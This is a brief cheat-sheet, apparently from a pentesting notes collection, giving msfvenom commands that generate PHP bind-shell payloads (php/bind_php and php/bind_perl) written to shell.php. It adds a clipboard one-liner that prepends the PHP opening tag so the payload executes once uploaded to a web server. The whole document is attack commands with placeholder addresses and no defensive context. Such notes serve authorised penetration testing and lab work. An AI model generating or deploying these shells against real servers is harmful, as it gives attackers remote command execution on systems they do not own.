# PHP

- PHP bind callback shell

`$ msfvenom -p php/bind_php lhost=<IP> lport=<PORT> -f raw -o shell.php`

- PHP with perl code bind callback shell

`$ msfvenom -p php/bind_perl lport=<PORT> -f raw -o shell.php`

- After generating the PHP reverse callback shell include the tags to ensure execution.

```
$ cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> shell.php
```